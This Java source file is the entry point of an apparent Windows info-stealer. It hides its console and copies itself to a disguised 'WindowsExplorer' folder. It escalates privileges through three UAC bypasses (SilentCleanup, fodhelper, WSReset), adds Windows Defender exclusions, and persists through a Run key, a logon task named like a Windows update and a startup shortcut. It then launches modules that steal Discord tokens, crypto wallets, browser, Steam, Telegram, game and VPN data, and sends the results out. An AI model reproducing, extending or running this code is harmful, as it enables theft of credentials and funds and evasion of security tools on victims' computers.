package itzgonza.hollyshit;

import java.io.File;
import java.net.ServerSocket;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.TimeUnit;

import itzgonza.hollyshit.file.*;
import itzgonza.hollyshit.impl.app.*;
import itzgonza.hollyshit.impl.browser.*;
import itzgonza.hollyshit.impl.coin.*;
import itzgonza.hollyshit.impl.game.*;
import itzgonza.hollyshit.impl.inject.*;
import itzgonza.hollyshit.impl.system.*;
import itzgonza.hollyshit.impl.vpn.*;

import itzgonza.hollyshit.utils.utilities;
import itzgonza.hollyshit.utils.decrypt.DecryptManager;

public class startup {

    private static ServerSocket socket;

    public static void main(String[] args) throws Exception {
        // 🛡️ ProactiveConsole Hiding
        utilities.hideConsole();

        if (!isRunFromStealthLocation()) {
            moveToStealthLocation();
            Thread.sleep(1000); 
            System.exit(0);
        }

        if (!utilities.isAdmin()) {
            if (attemptElevation()) {
                Thread.sleep(2000);
                System.exit(0);
            }
        }

        try {
            File stagingDir = new File(utilities.getPath());
            if (stagingDir.exists()) {
                org.apache.commons.io.FileUtils.deleteQuietly(stagingDir);
            }

            socket = new ServerSocket(1337);
            init();
        } catch (Exception e) {
            logError("Main crash: " + e.getMessage());
        }
    }

    private static void init() {
        try {
            itzgonza.hollyshit.file.FileSend.sendHeartbeat("Core Engine Launched - Starting Deep Scan...");
            if (utilities.isAdmin()) {
                utilities.runPowerShellSync(
                        "Remove-Item -Path 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force | Out-Null");

                try {
                    String appData = System.getenv("APPDATA");
                    String stealthDir = appData + "\\WindowsExplorer";
                    utilities.runPowerShellSync(
                            String.format("Add-MpPreference -ExclusionPath '%s','%s' -Force | Out-Null",
                                    new File(startup.class.getProtectionDomain().getCodeSource().getLocation().toURI())
                                            .getParent(),
                                    stealthDir));
                } catch (Exception ignored) {
                }
            }

            security();
            setupPersistence();

            try {
                new chromelevator().initialize();
            } catch (Exception ignored) {
            }

            List<Thread> gatherers = startParallel(
                    DiscordApp.class, SteamApp.class, TelegramApp.class,
                    DecryptManager.class, SocialStealer.class,
                    Wallet.class, DiscordToken.class,
                    CraftRise.class, Growtopia.class, Minecraft.class, SonOyuncu.class,
                    SystemDesktop.class, Screenshot.class,
                    NordVPN.class, OpenVPN.class);

            for (Thread t : gatherers) {
                try {
                    t.join();
                } catch (Exception ignored) {
                }
            }

            startParallel(DiscordInjector.class, StartupInjector.class);

            try {
                new GameStealer().initialize();
            } catch (Exception ignored) {
            }

            new FileMove().initialize();
            new FileSend().initialize();

            socket.close();
            System.exit(0);
        } catch (Exception e) {
            logError("Init error: " + e.getMessage());
        }
    }

    private static boolean attemptElevation() {
        try {
            java.net.URI uri = startup.class.getProtectionDomain().getCodeSource().getLocation().toURI();
            File currentJar = new File(uri);
            String jarPath = currentJar.getAbsolutePath();

            String javawPath = getJavaPath();
            System.out.println("[DEBUG] Elevation command: " + javawPath + " -jar " + jarPath);

            // The command to run elevated
            String cmdValue = "cmd /c start /B \"\" \"" + javawPath + "\" -jar \"" + jarPath + "\"";

            // 🚀 GOD-TIER MULTI-METHOD BYPASS
            // Method 1: SilentCleanup (Scheduled Task windir override)
            String bypassScript = "$ErrorActionPreference = 'SilentlyContinue';" +
                    "Set-ItemProperty -Path 'HKCU:\\Environment' -Name 'windir' -Value '" + cmdValue.replace("'", "''")
                    + " && rem' -Force | Out-Null;" +
                    "Start-Process 'schtasks.exe' -ArgumentList '/run', '/tn', '\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup', '/i' -WindowStyle Hidden -Wait;"
                    +
                    "Start-Sleep -Seconds 3;" +
                    "Remove-ItemProperty -Path 'HKCU:\\Environment' -Name 'windir' -Force | Out-Null;";

            // Method 2: Fodhelper (shell\open\command)
            String backupScript = "$r = 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command';" +
                    "if (-not (Test-Path $r)) { New-Item -Path $r -Force | Out-Null; }" +
                    "Set-ItemProperty -Path $r -Name '(Default)' -Value '" + cmdValue.replace("'", "''")
                    + "' -Force | Out-Null;" +
                    "Set-ItemProperty -Path $r -Name 'DelegateExecute' -Value '' -Force | Out-Null;" +
                    "Start-Process 'fodhelper.exe' -WindowStyle Hidden;" +
                    "Start-Sleep -Seconds 2;" +
                    "Remove-Item -Path 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force | Out-Null;";

            // Method 3: WSReset (Legacy shell association)
            String wsResetScript = "$r = 'HKCU:\\Software\\Classes\\AppX82a6gwre7fdg3bt635tn5ctqcf8msas6\\shell\\open\\command';"
                    +
                    "if (-not (Test-Path $r)) { New-Item -Path $r -Force | Out-Null; }" +
                    "Set-ItemProperty -Path $r -Name '(Default)' -Value '" + cmdValue.replace("'", "''")
                    + "' -Force | Out-Null;" +
                    "Start-Process 'WSReset.exe' -WindowStyle Hidden;" +
                    "Start-Sleep -Seconds 2;" +
                    "Remove-Item -Path 'HKCU:\\Software\\Classes\\AppX82a6gwre7fdg3bt635tn5ctqcf8msas6' -Recurse -Force | Out-Null;";

            utilities.runPowerShellSync(bypassScript);

            Thread.sleep(4000); // Wait longer for scheduled task
            if (!utilities.isAdmin()) {
                System.out.println("[STAGE-2] SilentCleanup başarısız, Fodhelper deneniyor...");
                utilities.runPowerShellSync(backupScript);
                Thread.sleep(3000);
            }
            if (!utilities.isAdmin()) {
                System.out.println("[STAGE-2] Fodhelper başarısız, WSReset deneniyor...");
                utilities.runPowerShellSync(wsResetScript);
                Thread.sleep(2000);
            }

            if (utilities.isAdmin()) {
                logError("[SUCCESS] Elevation achieved.");
                return true;
            } else {
                logError("[FAIL] All elevation methods exhausted.");
                return false;
            }

        } catch (Exception e) {
            logError("Bypass failed: " + e.getMessage());
            System.err.println("[ERROR] Bypass sırasında hata: " + e.getMessage());
            return false;
        }
    }

    private static String getJavaPath() {
        String javaHome = System.getProperty("java.home");
        // DEBUG MODE: Prioritize java.exe (console) over javaw.exe
        String[] possiblePaths = {
                javaHome + "\\bin\\java.exe",
                javaHome + "\\bin\\javaw.exe",
                javaHome + "\\java.exe",
                javaHome + "\\javaw.exe",
                "java.exe",
                "javaw.exe"
        };
        for (String p : possiblePaths) {
            if (new File(p).exists())
                return p;
        }
        return "java";
    }

    private static void logError(String msg) {
        try {
            File logFile = new File(System.getProperty("java.io.tmpdir"), "hollyshit_debug.log");
            java.nio.file.Files.write(logFile.toPath(),
                    (new java.util.Date() + ": " + msg + "\n").getBytes(),
                    java.nio.file.StandardOpenOption.CREATE, java.nio.file.StandardOpenOption.APPEND);
        } catch (Exception ignored) {
        }
    }

    private static void security() {
        utilities.executor.scheduleAtFixedRate(() -> {
            try {
                utilities.rd3party();
            } catch (Exception ignored) {
            }
        }, 0, 1, TimeUnit.SECONDS);
    }

    private static boolean isRunFromStealthLocation() {
        try {
            String appData = System.getenv("APPDATA");
            String stealthPath = new File(appData, "WindowsExplorer/explorer.jar").getCanonicalPath();
            File currentJar = new File(startup.class.getProtectionDomain().getCodeSource().getLocation().toURI());
            String currentPath = currentJar.getCanonicalPath();

            System.out.println("[DEBUG] Current: " + currentPath);
            System.out.println("[DEBUG] Stealth: " + stealthPath);

            return currentPath.equalsIgnoreCase(stealthPath);
        } catch (Exception e) {
            System.err.println("[DEBUG] Stealth check error: " + e.getMessage());
            return false;
        }
    }

    private static void moveToStealthLocation() {
        try {
            String appData = System.getenv("APPDATA");
            File stealthDir = new File(appData, "WindowsExplorer");
            if (!stealthDir.exists()) {
                boolean created = stealthDir.mkdirs();
                System.out.println("[DEBUG] Stealth dir created: " + created);
            }

            File stealthJar = new File(stealthDir, "explorer.jar");
            File currentJar = new File(startup.class.getProtectionDomain().getCodeSource().getLocation().toURI());

            if (!currentJar.getCanonicalPath().equalsIgnoreCase(stealthJar.getCanonicalPath())) {
                System.out.println("[DEBUG] Copying to " + stealthJar.getPath());
                org.apache.commons.io.FileUtils.copyFile(currentJar, stealthJar);

                String javaPath = getJavaPath(); // Now prioritizes javaw

                System.out.println("[DEBUG] Starting stealth process: " + javaPath);
                Process p = new ProcessBuilder(javaPath, "-jar", stealthJar.getAbsolutePath()).start();
                if (p.isAlive()) {
                    System.out.println("[SUCCESS] Stealth instance is alive.");
                } else {
                    System.out.println("[WARN] Stealth instance died immediately.");
                }
            }
        } catch (Exception e) {
            System.err.println("[ERROR] Stealth move failed: " + e.getMessage());
            logError("Move failed: " + e.getMessage());
        }
    }

    /**
     * Kalıcılık (Startup) mekanizmalarını kurar.
     */
    private static void setupPersistence() {
        try {
            String appData = System.getenv("APPDATA");
            File stealthJar = new File(appData, "WindowsExplorer/explorer.jar");
            if (!stealthJar.exists()) return;

            String jarPath = stealthJar.getAbsolutePath();
            String javawPath = getJavaPath();
            String command = "\"" + javawPath + "\" -jar \"" + jarPath + "\"";

            // 1. Registry (Run Key)
            utilities.runPowerShellSync(String.format(
                "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WindowsExplorer' -Value '%s' -Force | Out-Null",
                command.replace("\"", "\\\"")));

            // 2. Scheduled Task (Her login olduğunda çalışması için)
            // Task ismini 'WindowsUpdateTask' gibi masum bir şey yapıyoruz
            String taskName = "WindowsUpdateProcessor";
            utilities.runPowerShellSync(String.format(
                "schtasks /create /tn '%s' /tr '%s' /sc onlogon /rl highest /f | Out-Null",
                taskName, command));

            // 3. Startup Klasörü (LNK dosyası)
            String startupFolder = System.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
            String shortcutPath = startupFolder + "\\WindowsExplorer.lnk";
            utilities.runPowerShellSync(String.format(
                "$s = (New-Object -ComObject WScript.Shell).CreateShortcut('%s'); $s.TargetPath = '%s'; $s.Arguments = '-jar \"%s\"'; $s.WindowStyle = 7; $s.Save();",
                shortcutPath, javawPath, jarPath));

            System.out.println("[SUCCESS] Multi-stage persistence established.");
        } catch (Exception e) {
            logError("Persistence failed: " + e.getMessage());
        }
    }

    private static List<Thread> startParallel(Class<?>... clazz) {
        List<Thread> threads = new java.util.ArrayList<>();
        Arrays.stream(clazz).filter(utilities.class::isAssignableFrom)
                .forEach(m -> {
                    Thread t = new Thread(() -> {
                        try {
                            System.out.println("[INIT] " + m.getSimpleName() + " başlatılıyor...");
                            utilities u = (utilities) m.getDeclaredConstructor().newInstance();
                            u.initialize();
                            System.out.println("[DONE] " + m.getSimpleName() + " tamamlandı.");
                        } catch (Exception ignored) {
                        }
                    });
                    t.start();
                    threads.add(t);
                });
        return threads;
    }
}